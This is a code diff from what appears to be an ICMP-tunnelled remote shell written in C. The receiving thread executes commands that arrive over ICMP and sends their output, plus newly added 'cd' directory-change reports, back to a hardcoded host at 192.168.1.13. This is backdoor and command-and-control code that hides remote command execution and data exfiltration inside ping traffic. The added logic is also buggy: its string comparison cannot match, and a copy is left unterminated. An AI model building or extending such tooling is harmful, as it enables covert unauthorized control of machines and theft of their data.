@@ -206,6 +206,21 @@ void *receive_icmp_data(void *lparam){
         }
         
           //printf("test");
+          char pwd[100];
+          char buffercd[50];
+          char pwdbuff[100];
+          sprintf(buffercd, "%c%c%c", data[0], data[1], data[2]);
+          printf("Command: %s", data);
+          //printf("cd: %s", buffercd);
+          if (buffercd == "cd "){
+            //printf("is equal\n");
+            char path[200];
+            strncpy(path,data+3,strlen(data)-3);
+            chdir(path);
+            sprintf(pwd, "Moved to: %s", getcwd(pwdbuff, 100));
+            icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), pwd, sizeof(pwd));
+          }
+          
           FILE *output;
           char buffer[BUFFER2]; 
           char commandoutput[BUFFER2];
@@ -216,10 +231,12 @@ void *receive_icmp_data(void *lparam){
           }else{
             while(fgets(buffer,BUFFER2-1,output) != NULL){
               icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), buffer, sizeof(buffer));
-              strcpy(commandoutput, buffer);
+              //strcpy(commandoutput, buffer);
             }
           }
-          strcpy(data, commandoutput);
+          //fflush(stdout);
+          //memset(data, 0x00, nbytes);
+          //strcpy(data, commandoutput);
           //printf("Data: %s\n", data);
           
       }
